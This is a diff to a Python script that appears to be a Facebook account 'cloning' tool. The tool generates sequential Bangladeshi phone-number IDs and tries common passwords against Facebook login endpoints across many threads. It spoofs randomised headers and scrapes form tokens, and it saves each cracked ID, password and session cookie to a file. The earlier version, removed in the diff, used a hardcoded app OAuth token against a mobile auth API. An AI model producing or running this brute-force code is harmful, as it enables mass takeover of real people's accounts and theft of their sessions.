@@ -175,6 +175,24 @@ def Vivo():
 
     return ua
 
+def lsb():
+    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
+    lower = ''.join(random.choices(string.ascii_lowercase, k=4))
+    number = ''.join(random.choices(string.digits, k=1))
+    password = upper + lower + number
+    password_list = list(password)
+    random.shuffle(password_list)
+    return ''.join(password_list)
+
+
+def referer():
+    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
+    lower = ''.join(random.choices(string.ascii_lowercase, k=6))
+    number = ''.join(random.choices(string.digits, k=5))
+    password = upper + lower + number
+    password_list = list(password)
+    random.shuffle(password_list)
+    return ''.join(password_list)
 
 # -----------#
 
@@ -421,117 +439,120 @@ def ran():
     else:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]017, 018, 019")
+        print("[b]     [red1]✗ [chartreuse1]Type A BD Number EX   [orange3]▶  [chartreuse1]01701819458")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
+        print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
         limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
 
         for i in range(limit):
-            data = str(random.choice(range(10000000, 99999999)))
+            data = str(int(code) + i)
             user.append(data)
-    print("[b]    [red1][1] [spring_green1]Method 1")
-    print("[b]    [red1][2] [spring_green1]Method 2")
-    print("[b]    [red1][3] [spring_green1]Method 3")
-    print("[b]    [red1][4] [spring_green1]Method 4")
-    print("[b]    [red1][5] [spring_green1]Method 5")
+    print(" Method 1(Best)")
+    print(" Method 2")
+    print(" Method 3")
+    print(" Method 4")
+    print(" Method 5")
+    print(" Method 6")
     print(sort.line())
     meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
-
-    with ThreadPool(max_workers=70) as heron:
+    if meth in ["1", "a", "A"]:
+        fb = "mbasic"
+    elif meth in ["2", "b", "B"]:
+        fb = "x"
+    elif meth in ["3", "c", "C"]:
+        fb = "p"
+    elif meth in ["4", "d", "D"]:
+        fb = "touch"
+    elif meth in ["5", "e", "E"]:
+        fb = "free"
+    else:
+        fb = "m"
+    with ThreadPool(max_workers=30) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
-        print(f" [b]    [red1]✗ [light_green]Cod/Met   [orange3]▶  [light_green]{code}/M" + meth)
+        print(f" [b]    [red1]✗ [light_green]Method   [orange3]▶  [light_green] M" + meth)
         print(sort.line())
         for xd in user:
-            uid = code + xd
+            uid = "0" + xd
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[1:]]
             else:
-                pwx = [uid, uid[:6], uid[:7], uid[:8], xd, xd[1:], xd[2:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####"]
-            heron.submit(ren_sub, uid, pwx, meth, user)
+                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####"]
+            heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
-def ren_sub(uid, pwx, meth, user):
+def ren_sub(uid, pwx, meth, user, fb):
     global oks, loop
+    shadid = random.choice(sys_ua)
+    custom_agent = ""
+    session = requests.Session()
+    sys.stdout.write(
+        f"\r  \x1b[38;1;155m\x1b[38;5;155m[SHADID-M{meth}]   {loop}⟩\x1b[38;5;155m{str(len(user))}\r ")
+    sys.stdout.flush()
     try:
-        Session = requests.session()
-        shadid = random.choice(sys_ua)
-        custom_agent = ""
-        sys.stdout.write(
-            f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(user))}\033[38;5;46m] \r")
-        sys.stdout.flush()
         for ps in pwx:
+            free_fb = session.get(f'https://{fb}.facebook.com').text
+            info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
+                    "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
+            uax = ua()
+            ver1 = str(random.randrange(1, 99))
+            ver2 = str(random.randrange(90, 121))
+            lsd = lsb()
+            refer = referer()
+            dpr = str(random.randrange(2, 6))
+            sceme = random.choice(['light', 'dark'])
+            had = {
+                'Host': f'{fb}.facebook.com',
+                'content-length': str(random.randrange(1600, 1800, 10)),
+                'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
+                'sec-ch-ua-mobile': '?1',
+                'user-agent': uax,
+                'x-response-format': 'JSONStream',
+                'content-type': 'application/x-www-form-urlencoded',
+                'x-fb-lsd': lsd,
+                'viewport-width': '360',
+                'sec-ch-ua-platform-version': '""',
+                'x-requested-with': 'XMLHttpRequest',
+                'x-asbd-id': '129477',
+                'dpr': dpr,
+                'sec-ch-ua-full-version-list': '',
+                'sec-ch-ua-model': '""',
+                'sec-ch-prefers-color-scheme': sceme,
+                'sec-ch-ua-platform': '"Android"',
+                'accept': '*/*',
+                'origin': f'https://{fb}.facebook.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
+                'accept-encoding': 'gzip, deflate, br,',
+                'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
+            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            session.post(url=url, data=info, headers=had)
+            heron_brand = session.cookies.get_dict().keys()
+            if "c_user" in heron_brand:
+                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                xx = coki.split("c_user=")[1][:15].replace(";", "  ")
 
-            if meth in ["1", "01"]:
-                agent = shadid
-            elif meth in ["2", "02"]:
-                agent = Vivo()
-            elif meth in ["3", "03"]:
-                agent = Motorola()
-            elif meth in ["4", "04"]:
-                agent = Samsung()
-            else:
-                agent = custom_agent
-            data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'email': uid,
-                'password': ps,
-                'generate_analytics_claims': '1',
-                'community_id': '',
-                'cpl': 'true',
-                'try_num': '1',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'password',
-                'source': 'login',
-                'error_detail_type': 'button_with_disabled',
-                'enroll_misauth': 'false',
-                'generate_session_cookies': '1',
-                'generate_machine_id': '1',
-                'currently_logged_in_userid': '0',
-                'locale': 'en_GB',
-                'client_country_code': 'GB',
-                'fb_api_req_friendly_name': 'authenticate'}
-            head = {
-                'User-Agent': agent,
-                'Accept-Encoding': 'gzip, deflate',
-                'Accept': '*/*',
-                'Connection': 'keep-alive',
-                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'X-FB-Friendly-Name': 'authenticate',
-                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
-                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                'X-FB-Connection-Type': 'unknown',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'X-FB-HTTP-Engine': 'Liger'}
-            url1 = 'https://b-graph.facebook.com/auth/login'
-            po = Session.post(url=url1, data=data, headers=head, allow_redirects=False).json()
-            if "session_key" in po:
-                uid = po["uid"]
-                oks.append(uid)
-                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
-                print(
-                    f"\r\r[reverse white][PRINCE-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/SD-RANDOM-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
+                print(f"\r\r[SUCCESSFUL] {xx} <> {ps}\n[Cookies]{coki}")
+                open("/sdcard/SHADID-OK.txt", "a").write(xx + "|" + ps + "|" + coki + "\n")
                 break
-            elif "Please Confirm Email" in str(po):
-                oks.append(uid)
-                uid = po["uid"]
-                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
-                print(
-                    f"\r\r[reverse white][PRINCE-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/SD-RANDOM-CP", "a").write(uid + "|" + ps + "|" + coki + "\n")
-                break
+
+            elif "checkpoint" in heron_brand:
+                pass
+                # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
             else:
                 continue
         loop += 1
-    except:
+    except Exception as e:
         time.sleep(30)
+
 
 
 def main():
